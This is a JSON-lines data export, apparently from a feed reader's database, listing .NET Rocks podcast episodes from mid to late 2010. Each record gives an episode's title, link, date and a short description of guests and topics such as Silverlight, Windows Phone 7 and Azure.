{"k":"0000000082","o":"0000000632","v":"001"}
{"_id":270,"_uid":270,"_dt":1373728933932,"_s":"003d94be900651183eef973769f4faca"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=622","title":"Eric Falsken Builds Object Databases","published":{"$wrap":"$date","v":1293076800000,"h":"2010-12-23T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Eric Falsken of db4o. db4o is an open source object database for Java and .NET. Object databases have been around since the 1980s, but recently have become part of the NoSQL movement. Eric discusses the NoSQL movement in general and how various products fit into the ecosystem, including db4o.","author":false,"_id":{"$wrap":"$oid","v":270}}
{"k":"0000000082","o":"0000000539","v":"001"}
{"_id":271,"_uid":271,"_dt":1373728933933,"_s":"05f161affc92d4ff57a83b31cf51f0f3"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=621","title":"Miguel de Icaza Builds .NET Apps on the Mac with MonoMac","published":{"$wrap":"$date","v":1292904000000,"h":"2010-12-21T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Miguel de Icaza about MonoMac and rest the of the Mono universe. MonoMac is a set of tools to let .NET developers build applications for the Mac using the Mac UI elements in Cocoa.","author":false,"_id":{"$wrap":"$oid","v":271}}
{"k":"0000000082","o":"0000000780","v":"001"}
{"_id":272,"_uid":272,"_dt":1373728933934,"_s":"81daed78a25da4df35719cfc3357b9f6"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=620","title":"Mobility at Oredev","published":{"$wrap":"$date","v":1292472000000,"h":"2010-12-16T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard did a series of interviews at Oredev with folks building mobile applications. First up is Jeff Wilcox, who talks about Silverlight in the context of Windows Phone 7 and beyond. Next, Marcus Zarra talks about building iPhone and iPad applications. Third, Sanyu Kiruluta discusses building applications for Blackberry. Finally, Carl and Richard talk to Evan Doll, former Apple employee and co-founder of Flipboard about his incredible social media application for iPad.","author":false,"_id":{"$wrap":"$oid","v":272}}
{"k":"0000000082","o":"0000000602","v":"001"}
{"_id":273,"_uid":273,"_dt":1373728933935,"_s":"56ec59bc109e81927b14ee7b49918563"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=619","title":"Shawn Wildermuth on Silverlight, Windows Phone 7, HTML 5, oData and more!","published":{"$wrap":"$date","v":1292299200000,"h":"2010-12-14T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Shawn Wildermuth about Silverlight, Windows Phone 7, HTML 5, oData and more! Yes, a lot of topics, but it all holds together on how people are going to build applications in the future, for the desktop, the web and the phones.","author":false,"_id":{"$wrap":"$oid","v":273}}
{"k":"0000000082","o":"0000000539","v":"001"}
{"_id":274,"_uid":274,"_dt":1373728933936,"_s":"13cd1d7b5dff1d53e5430f741db8b1c0"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=618","title":"Panel Discussion on Data Access in Silverlight at DevReach","published":{"$wrap":"$date","v":1291867200000,"h":"2010-12-09T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to John Waters and Walt Ritscher about the data access technologies available to work with Silverlight. The conversation wanders over all of XAML, including WPF and Windows Phone 7.","author":false,"_id":{"$wrap":"$oid","v":274}}
{"k":"0000000082","o":"0000000657","v":"001"}
{"_id":275,"_uid":275,"_dt":1373728933936,"_s":"8bf73434aed31745eb1a395f8020d1b0"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=617","title":"Scott Guthrie is still working on Silverlight","published":{"$wrap":"$date","v":1291694400000,"h":"2010-12-07T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard chat with Microsoft Vice President and all around great guy, Scott Guthrie. Scott talks about some of the new features coming in Silverlight 5. The conversation jumps over to HTML 5 toward the end, focusing on what ASP.NET will support in the space. Apologies for Carl's phone track. We'll try to be better people. :)","author":false,"_id":{"$wrap":"$oid","v":275}}
{"k":"0000000082","o":"0000000564","v":"001"}
{"_id":276,"_uid":276,"_dt":1373728933937,"_s":"2b0906d6d84a60d12d2ac285bb6b11d0"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=616","title":"Up in the Clouds at Oredev!","published":{"$wrap":"$date","v":1291262400000,"h":"2010-12-02T04:00:00.000Z"},"starred":false,"read":false,"content":"Another set of stories from Oredev, this time about cloud technology. First up is Chris Auld, talking about the economics of Azure. Next is Adrian Cole, talking about jCloud provisioning. Third is a deep discussion with Jim Webber and Ian Robinson about REST.","author":false,"_id":{"$wrap":"$oid","v":276}}
{"k":"0000000082","o":"0000000770","v":"001"}
{"_id":277,"_uid":277,"_dt":1373728933938,"_s":"a436a9e272ab0ac858650165900599df"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=615","title":"Martin Woodward Brings Team Foundation Server to Everyone!","published":{"$wrap":"$date","v":1291089600000,"h":"2010-11-30T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Martin Woodward about Team Foundation Server being used for more than just .NET development. Martin used to work for Teamprise until the technology was acquired by Microsoft in 2009 and he made the transition from being an MVP to being a 'blue badge'. The conversation ranges over the new features of TFS 2010, how Java developers can also use TFS, the effects of different process templates in TFS, and more!","author":false,"_id":{"$wrap":"$oid","v":277}}
{"k":"0000000082","o":"0000000677","v":"001"}
{"_id":278,"_uid":278,"_dt":1373728933939,"_s":"66141c8b5b5c08495a2d8b91ce2b13a6"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=614","title":"Developing Your Career at Oredev!","published":{"$wrap":"$date","v":1290657600000,"h":"2010-11-25T04:00:00.000Z"},"starred":false,"read":false,"content":"This show is three interviews recorded at Oredev, all around thoughts to expand your career and education. The first is from Michael Norton, discussing taking control of your career. Second, a conversation with Dave Hoover about the apprenticeship and journeyman process of software craftsmanship. Finally, Bill Pugh talks about teaching college students to program.","author":false,"_id":{"$wrap":"$oid","v":278}}
{"k":"0000000082","o":"0000000768","v":"001"}
{"_id":279,"_uid":279,"_dt":1373728933940,"_s":"c01826ab4f2d2fd53972a922d6a8271d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=613","title":"The Keynoters at Oredev","published":{"$wrap":"$date","v":1290571200000,"h":"2010-11-24T04:00:00.000Z"},"starred":false,"read":false,"content":"This show is a collection of interviews with the keynote speakers at Oredev. First up is a conversation with Dr. Jeff Norris from NASA, who's keynote focused on the agility shown by folks like Alexander Graham Bell. Next, John Seddon talks about maturing management techniques to get management out of the way of productivity. Finally, Nolan Bushnell, the founder of Atari and Chuck E Cheese, talks about the future of education. Three amazing luminaries in one show!","author":false,"_id":{"$wrap":"$oid","v":279}}
{"k":"0000000082","o":"0000000762","v":"001"}
{"_id":280,"_uid":280,"_dt":1373728933941,"_s":"d55728ae9bd518881af3820d7b44bcb5"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=612","title":".NET Luminaries at Oredev!","published":{"$wrap":"$date","v":1290052800000,"h":"2010-11-18T04:00:00.000Z"},"starred":false,"read":false,"content":"While at Oredev 2010 in Malmö, Sweden, Carl and Richard got to interview some of the great thinkers and doers of .NET. The first interview is with Jon Skeet, who talks about the upcoming Async features in C# 5. Next, Glenn Block talks about where WCF is going and the move to put WCF source at wcf.codeplex.com. Finally, Ade Miller digs into how parallel development is becoming a focus at Microsoft. This is the first in a series of shows from Oredev 2010.","author":false,"_id":{"$wrap":"$oid","v":280}}
{"k":"0000000082","o":"0000000648","v":"001"}
{"_id":281,"_uid":281,"_dt":1373728933942,"_s":"8b797be2fe5663724d3f6597974e554d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=611","title":"Jon Skeet and Bill Wagner Disagree About C#","published":{"$wrap":"$date","v":1289880000000,"h":"2010-11-16T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Jon Skeet and Bill Wagner about C#. Both Jon and Bill have published books on C# and have reach each other's work. But C# is such a vast language, there are plenty of things that are subject to interpretation. We could have called this show a C# Smackdown, but these guys are too nice for such a thing!","author":false,"_id":{"$wrap":"$oid","v":281}}
{"k":"0000000082","o":"0000000495","v":"001"}
{"_id":282,"_uid":282,"_dt":1373728933943,"_s":"4faac8e1330a00cf0f93092df9bab0f9"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=610","title":"Natural User Interfaces at SDC!","published":{"$wrap":"$date","v":1289448000000,"h":"2010-11-11T04:00:00.000Z"},"starred":false,"read":false,"content":"While at SDC in Zeist, Netherlands, Carl and Richard talked to Scott Stanfield and Tim Huckaby about where user interfaces are going. The conversation ranged over touch, Kinect and more!","author":false,"_id":{"$wrap":"$oid","v":282}}
{"k":"0000000082","o":"0000000589","v":"001"}
{"_id":283,"_uid":283,"_dt":1373728933944,"_s":"ff185566ffdf8e80f91e84ec6b547674"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=609","title":"Tim Huckaby Live at DevConnections","published":{"$wrap":"$date","v":1289275200000,"h":"2010-11-09T04:00:00.000Z"},"starred":false,"read":false,"content":"While at DevConnections in Las Vegas, Carl and Richard talk to Tim Huckaby about his new company, turning the great innovations from Interknowlogy into products. Tim digs into his favorite NUI topics, as well as exploring the differences between services and product companies.","author":false,"_id":{"$wrap":"$oid","v":283}}
{"k":"0000000082","o":"0000000621","v":"001"}
{"_id":284,"_uid":284,"_dt":1373728933944,"_s":"98a111184d57979e38828e2789fec00a"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=608","title":"Designers and Developers at DevReach!","published":{"$wrap":"$date","v":1288843200000,"h":"2010-11-04T04:00:00.000Z"},"starred":false,"read":false,"content":"While at DevReach 2010 in Bulgaria, Carl and Richard talk to Scott Stanfield, Stephen Forte and Lino Tadros about the working relationship between developers and designers. The conversation explores a number of platforms, including iPhone, Android, Windows Phone 7, Blackberry, Silverlight, Flash and more.","author":false,"_id":{"$wrap":"$oid","v":284}}
{"k":"0000000082","o":"0000000761","v":"001"}
{"_id":285,"_uid":285,"_dt":1373728933945,"_s":"e9a62b398694da7370c5be71159f6915"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=607","title":"Ted Neward and Dierk Konig Compare .NET and JVM Evolution","published":{"$wrap":"$date","v":1288670400000,"h":"2010-11-02T04:00:00.000Z"},"starred":false,"read":false,"content":"While at DevCon in London, Carl and Richard hosted a discussion with guests Ted Neward and Dierk Konig about the differences and similarities between .NET and the JVM. The discussion ranges over the different languages that are implemented against the platform, how the ownership model of the platforms differs and how that impacts the evolution, right down to how to make the two platforms work and play well with each other.","author":false,"_id":{"$wrap":"$oid","v":285}}
{"k":"0000000082","o":"0000000435","v":"001"}
{"_id":286,"_uid":286,"_dt":1373728933946,"_s":"e614c9bdb2bc0d67b145b674cf38430f"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=606","title":"Phil Haack on Razor, MVC, NuPack and More!","published":{"$wrap":"$date","v":1288238400000,"h":"2010-10-28T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Phil Haack. The conversation ranges over Razor, the MVC3 Beta, WebMatrix, NuPack and more!","author":false,"_id":{"$wrap":"$oid","v":286}}
{"k":"0000000082","o":"0000000406","v":"001"}
{"_id":287,"_uid":287,"_dt":1373728933947,"_s":"f91c833217fbd01a94ca3b7174270928"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=605","title":"Rocky Lhotka is CSLA and More","published":{"$wrap":"$date","v":1288065600000,"h":"2010-10-26T04:00:00.000Z"},"starred":false,"read":false,"content":"From the .NET Rocks Live Weekend, Carl and Richard talk to Rocky Lhotka. What else is there to say?","author":false,"_id":{"$wrap":"$oid","v":287}}
{"k":"0000000082","o":"0000000487","v":"001"}
{"_id":288,"_uid":288,"_dt":1373728933948,"_s":"54060d88af5e5e1ae82778416396766c"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=604","title":"Brian Randell is Completely Virtual","published":{"$wrap":"$date","v":1287633600000,"h":"2010-10-21T04:00:00.000Z"},"starred":false,"read":false,"content":"From the .NET Rocks Live Weekend, Carl and Richard talk to Brian Randell about his work with TFS and Hyper-V. The conversation digs into testing infrastructure using Hyper-V.","author":false,"_id":{"$wrap":"$oid","v":288}}
{"k":"0000000082","o":"0000000448","v":"001"}
{"_id":289,"_uid":289,"_dt":1373728933948,"_s":"9568a6a24935a2004833cbe5c73cea5c"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=603","title":"The Future of Web Apps from Tech Ed New Zealand","published":{"$wrap":"$date","v":1287460800000,"h":"2010-10-19T04:00:00.000Z"},"starred":false,"read":false,"content":"While Carl and Richard were at Tech Ed New Zealand, Richard moderated a panel discussion on the future of web applications.","author":false,"_id":{"$wrap":"$oid","v":289}}
{"k":"0000000082","o":"0000000468","v":"001"}
{"_id":290,"_uid":290,"_dt":1373728933949,"_s":"d487311376b0ff87e9057cc1582d1669"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=602","title":"Steve Evans Knows IT","published":{"$wrap":"$date","v":1287028800000,"h":"2010-10-14T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Steve Evans during the .NET Rocks Live Weekend. Steve and Richard totally geek out on living in the space between development and infrastructure.","author":false,"_id":{"$wrap":"$oid","v":290}}
{"k":"0000000082","o":"0000000479","v":"001"}
{"_id":291,"_uid":291,"_dt":1373728933950,"_s":"a9253d3f9eb44c1b92a963be4e04b983"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=601","title":"Talking Internet Explorer 9 with Pete LePage","published":{"$wrap":"$date","v":1286856000000,"h":"2010-10-12T04:00:00.000Z"},"starred":false,"read":false,"content":"While at TechDays in Vancouver, Carl and Richard recorded a .NET Rocks Live with Pete LePage, talking about IE9, which had just been released to public beta.","author":false,"_id":{"$wrap":"$oid","v":291}}
{"k":"0000000082","o":"0000000384","v":"001"}
{"_id":292,"_uid":292,"_dt":1373728933951,"_s":"44ca716f9e78d4cabc7e937ddd04c805"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=600","title":"Show 600!","published":{"$wrap":"$date","v":1286424000000,"h":"2010-10-07T04:00:00.000Z"},"starred":false,"read":false,"content":"Holy cow, it's show 600! Carl and Richard look back on memorable moments from the last 100 shows.","author":false,"_id":{"$wrap":"$oid","v":292}}
{"k":"0000000082","o":"0000000497","v":"001"}
{"_id":293,"_uid":293,"_dt":1373728933951,"_s":"e7f3ef372f5472a732c3b776ac21c178"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=599","title":"Andrew Brust Gets All BI On Us","published":{"$wrap":"$date","v":1286251200000,"h":"2010-10-05T04:00:00.000Z"},"starred":false,"read":false,"content":"Andrew Brust joins Carl and Richard on the .NET Rocks Live Weekend to talk a little Business Intelligence. The conversation also jumps to Windows Phone 7, Google Android and the Apple iPad.","author":false,"_id":{"$wrap":"$oid","v":293}}
{"k":"0000000082","o":"0000000454","v":"001"}
{"_id":294,"_uid":294,"_dt":1373728933952,"_s":"30f2043903f1035521dd95c17a2b1a6f"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=598","title":"Mark Relph Wants More Windows Applications!","published":{"$wrap":"$date","v":1285819200000,"h":"2010-09-30T04:00:00.000Z"},"starred":false,"read":false,"content":"While at TechDays Vancouver, Carl and Richard talk to Mark Relph from the Microsoft Windows team about building Windows applications.","author":false,"_id":{"$wrap":"$oid","v":294}}
{"k":"0000000082","o":"0000000449","v":"001"}
{"_id":295,"_uid":295,"_dt":1373728933953,"_s":"7fe1224d76eb622118893bc85b8f1a63"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=597","title":"Building More Windows Phone 7 Applications","published":{"$wrap":"$date","v":1285646400000,"h":"2010-09-28T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to two different developers currently working on Windows Phone 7 applications: Jeff Walker and Ahmed Zaman.","author":false,"_id":{"$wrap":"$oid","v":295}}
{"k":"0000000082","o":"0000000504","v":"001"}
{"_id":296,"_uid":296,"_dt":1373728933954,"_s":"16934b08eda2e6c837abba68b6a33463"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=596","title":"Billy Hollis Still Builds Apps","published":{"$wrap":"$date","v":1285214400000,"h":"2010-09-23T04:00:00.000Z"},"starred":false,"read":false,"content":"From the .NET Rocks Live Weekend, Carl and Richard talk to Billy Hollis. Billy was last on the show during the .NET Rocks Road Trip, and it seems like the conversation just picked up from there...","author":false,"_id":{"$wrap":"$oid","v":296}}
{"k":"0000000082","o":"0000000536","v":"001"}
{"_id":297,"_uid":297,"_dt":1373728933954,"_s":"a4aa8c5737cffd115fa960457737d4cb"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=595","title":"Brandon Watson and Friends Build Windows Phone 7 Apps!","published":{"$wrap":"$date","v":1285041600000,"h":"2010-09-21T04:00:00.000Z"},"starred":false,"read":false,"content":"In the first of a two-part series on the Windows Phone, Carl and Richard talk to developers in the field currently building Windows Phone 7 apps. A talk with Brandon Watson from the WP7 team kicks it off.","author":false,"_id":{"$wrap":"$oid","v":297}}
{"k":"0000000082","o":"0000000493","v":"001"}
{"_id":298,"_uid":298,"_dt":1373728933955,"_s":"6703de14fccf11461c2d4c70e7574655"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=594","title":"Charles Petzold Talks New UI","published":{"$wrap":"$date","v":1284609600000,"h":"2010-09-16T04:00:00.000Z"},"starred":false,"read":false,"content":"From the .NET Rocks Live Weekend, Carl and Richard talk to Charles Petzold about the old days of development and the new days - Charles is focused on WPF, Silverlight and Windows Phone 7.","author":false,"_id":{"$wrap":"$oid","v":298}}
{"k":"0000000082","o":"0000000447","v":"001"}
{"_id":299,"_uid":299,"_dt":1373728933956,"_s":"8d6f3191d65c7fcc76b44719747d7c26"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=593","title":"Pat Hynds Still Cares About Security","published":{"$wrap":"$date","v":1284436800000,"h":"2010-09-14T04:00:00.000Z"},"starred":false,"read":false,"content":"Pat Hynds talks to Carl and Richard during the .NET Rocks Live Weekend about how security still matters in the mature .NET 4.0 world.","author":false,"_id":{"$wrap":"$oid","v":299}}
{"k":"0000000082","o":"0000000561","v":"001"}
{"_id":300,"_uid":300,"_dt":1373728933957,"_s":"3df047829a49bd0c0b1209349846334c"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=592","title":"Rob Howard is very Telligent","published":{"$wrap":"$date","v":1284004800000,"h":"2010-09-09T04:00:00.000Z"},"starred":false,"read":false,"content":"From the .NET Rocks Live Weekend, Carl and Richard catch up with Rob Howard. Rob talks about how Telligent has changed and their new focus on a different customer base that has significantly refocused their product development efforts toward social media.","author":false,"_id":{"$wrap":"$oid","v":300}}
{"k":"0000000082","o":"0000000410","v":"001"}
{"_id":301,"_uid":301,"_dt":1373728933958,"_s":"098a1b725e825327ceaf3f5ff34dd227"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=591","title":"Stories from Tech Ed Australia!","published":{"$wrap":"$date","v":1283832000000,"h":"2010-09-07T04:00:00.000Z"},"starred":false,"read":false,"content":"While at Tech Ed Australia, Carl and Richard did a variety of interviews with speakers and attendees.","author":false,"_id":{"$wrap":"$oid","v":301}}
{"k":"0000000082","o":"0000000459","v":"001"}
{"_id":302,"_uid":302,"_dt":1373728933958,"_s":"a1d225a23566a4b9d8963f7147330e0c"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=590","title":"Mark Dunn is All About Training","published":{"$wrap":"$date","v":1283400000000,"h":"2010-09-02T04:00:00.000Z"},"starred":false,"read":false,"content":"During the .NET Rocks Live Weekend, Carl and Richard talk to former co-host Mark Dunn about his working in training programmers to be more productive.","author":false,"_id":{"$wrap":"$oid","v":302}}
{"k":"0000000082","o":"0000000424","v":"001"}
{"_id":303,"_uid":303,"_dt":1373728933959,"_s":"ed997287fccd347983020a171cd72bd4"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=589","title":"Sahil Malik is Still Nutty About Sharepoint","published":{"$wrap":"$date","v":1283227200000,"h":"2010-08-31T04:00:00.000Z"},"starred":false,"read":false,"content":"Another great .NET Rocks Live Weekend show, Carl and Richard talk to Sahil Malik about Sharepoint 2010.","author":false,"_id":{"$wrap":"$oid","v":303}}
{"k":"0000000082","o":"0000000456","v":"001"}
{"_id":304,"_uid":304,"_dt":1373728933959,"_s":"81bd8de8fdabbe0b6aa1c94cc93d3260"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=588","title":"Ethan Winer, Very Old School","published":{"$wrap":"$date","v":1282795200000,"h":"2010-08-26T04:00:00.000Z"},"starred":false,"read":false,"content":"During the .NET Rocks Live Weekend, Carl and Richard talk to Ethan Winer about the old days of development as well as audio systems, design and myths.","author":false,"_id":{"$wrap":"$oid","v":304}}
{"k":"0000000082","o":"0000000724","v":"001"}
{"_id":305,"_uid":305,"_dt":1373728933960,"_s":"d811bae54b20450328fa63dd1b1b08ed"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=587","title":"Ted Neward Programs in Everything","published":{"$wrap":"$date","v":1282622400000,"h":"2010-08-24T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Ted Neward during the Live Weekend. They cover the acquisition of Sun by Oracle and the potential for Oracle to muster a significant move in the development marketplace. Ted also talks about his exploring of other languages, including Objective-C for the iPhone. The conversation also explores how Oracle will have to rationalize their collection of databases: Oracle, MySQL and Postgres.","author":false,"_id":{"$wrap":"$oid","v":305}}
{"k":"0000000082","o":"0000000578","v":"001"}
{"_id":306,"_uid":306,"_dt":1373728933961,"_s":"c72b114e20ac4ca985aeced56360128e"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=586","title":"Scott Stanfield Advertises Online","published":{"$wrap":"$date","v":1282190400000,"h":"2010-08-19T04:00:00.000Z"},"starred":false,"read":false,"content":"A great .NET Rocks Live Weekend show, Carl and Richard talk to Scott Stanfield from Vertigo. Scott discusses Vertigo's work around building video players for the NFL, Olympics and more. The conversation drives into how the advertising models around these events work.","author":false,"_id":{"$wrap":"$oid","v":306}}
{"k":"0000000082","o":"0000000387","v":"001"}
{"_id":307,"_uid":307,"_dt":1373728933962,"_s":"b2406cb767789be01039a38ec21fd566"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=585","title":"Richard Hundhausen looks anew at Scrum","published":{"$wrap":"$date","v":1282017600000,"h":"2010-08-17T04:00:00.000Z"},"starred":false,"read":false,"content":"Regional Director and MVP Richard Hundhausen takes a new look at Scrum.","author":false,"_id":{"$wrap":"$oid","v":307}}
{"k":"0000000082","o":"0000000426","v":"001"}
{"_id":308,"_uid":308,"_dt":1373728933963,"_s":"d9ac1c7f07f17d8b25914e9e1427dd75"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=584","title":"Brian Noyes Looks Through Prism","published":{"$wrap":"$date","v":1281585600000,"h":"2010-08-12T04:00:00.000Z"},"starred":false,"read":false,"content":"A show from the .NET Rocks Live Weekend, Brian Noyes talks about what's coming up in the latest incarnation of Prism.","author":false,"_id":{"$wrap":"$oid","v":308}}
{"k":"0000000082","o":"0000000524","v":"001"}
{"_id":309,"_uid":309,"_dt":1373728933963,"_s":"cc9bf89e6ad185f13c0150e65f0892a5"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=583","title":"Jay Schmelzer unveils Microsoft LightSwitch","published":{"$wrap":"$date","v":1281412800000,"h":"2010-08-10T04:00:00.000Z"},"starred":false,"read":false,"content":"Jay Schmelzer takes the wraps off Microsoft LightSwitch, a new tool that promises to significantly reduce the complexity involved in producing line of business applications for the cloud and the desktop.","author":false,"_id":{"$wrap":"$oid","v":309}}
{"k":"0000000082","o":"0000000511","v":"001"}
{"_id":310,"_uid":310,"_dt":1373728933964,"_s":"212835d6eb19a9134f7a4d2c61927504"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=582","title":"Scott Hanselman Enters the WebMatrix","published":{"$wrap":"$date","v":1280980800000,"h":"2010-08-05T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Scott Hanselman (yeah, *that* Scott Hanselman) about WebMatrix, a new set of tools added to the Web Platform Installer to make building and deploying web sites much easier.","author":false,"_id":{"$wrap":"$oid","v":310}}
{"k":"0000000082","o":"0000000506","v":"001"}
{"_id":311,"_uid":311,"_dt":1373728933965,"_s":"bddecd7d2ef22df18dc98f6b050fbc4c"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=581","title":"Kent Alstad is All About Performance","published":{"$wrap":"$date","v":1280808000000,"h":"2010-08-03T04:00:00.000Z"},"starred":false,"read":false,"content":"Another great .NET Rocks Live Weekend show, Carl and Richard talk to Kent Alstad, Richard's partner in crime at Strangeloop. Kent talks about his latest thoughts on making web sites go faster.","author":false,"_id":{"$wrap":"$oid","v":311}}
{"k":"0000000082","o":"0000000459","v":"001"}
{"_id":312,"_uid":312,"_dt":1373728933966,"_s":"b856fe97fbe9f24c76cd53283224728e"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=580","title":"Glenn Block is Still a MEF Head","published":{"$wrap":"$date","v":1280376000000,"h":"2010-07-29T04:00:00.000Z"},"starred":false,"read":false,"content":"During the .NET Rocks Live Weekend, Carl and Richard talked to Glenn Block - discovering he was no longer with the MEF team, but was still a MEF head.","author":false,"_id":{"$wrap":"$oid","v":312}}
{"k":"0000000082","o":"0000000401","v":"001"}
{"_id":313,"_uid":313,"_dt":1373728933966,"_s":"e67dd6f260033e95adfa5703cec3f2d8"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=579","title":"Tribune does Azure","published":{"$wrap":"$date","v":1280203200000,"h":"2010-07-27T04:00:00.000Z"},"starred":false,"read":false,"content":"Jerry Schulist from Tribune company talks to Carl and Richard about Tribune's embrace of Microsoft Azure.","author":false,"_id":{"$wrap":"$oid","v":313}}
{"k":"0000000082","o":"0000000453","v":"001"}
{"_id":314,"_uid":314,"_dt":1373728933967,"_s":"d74e8c174df0cd9d9e3cab756ca2f23c"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=578","title":"Silverlight PivotViewer","published":{"$wrap":"$date","v":1279771200000,"h":"2010-07-22T04:00:00.000Z"},"starred":false,"read":false,"content":"Matt Jubelirer from Microsoft talks with Carl and Richard about Silverlight PivotViewer, a radical new tool based on Deep Zoom for conceptualizing data.","author":false,"_id":{"$wrap":"$oid","v":314}}
{"k":"0000000082","o":"0000000489","v":"001"}
{"_id":315,"_uid":315,"_dt":1373728933968,"_s":"bca721da0dd153fc34f4097b0d1d2eab"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=577","title":"Catching up with Roy Osherove at NDC","published":{"$wrap":"$date","v":1279598400000,"h":"2010-07-20T04:00:00.000Z"},"starred":false,"read":false,"content":"Roy Osherove talks about his experience moving his software company's build servers into the cloud. Recorded June 17th in the Fishbowl at the Norwegian Developer's Conference.","author":false,"_id":{"$wrap":"$oid","v":315}}
{"k":"0000000082","o":"0000000434","v":"001"}
{"_id":316,"_uid":316,"_dt":1373728933969,"_s":"3bbdfb18d6053f8147a4d8db96563f8d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=576","title":"Seth Juarez on Machine Learning","published":{"$wrap":"$date","v":1279166400000,"h":"2010-07-15T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Seth Juarez on his work with Machine Learning algorithms. Seth breaks it down into a simple process.","author":false,"_id":{"$wrap":"$oid","v":316}}
{"k":"0000000082","o":"0000000522","v":"001"}
{"_id":317,"_uid":317,"_dt":1373728933969,"_s":"99402873bc5012fd0817633f4eff2747"}
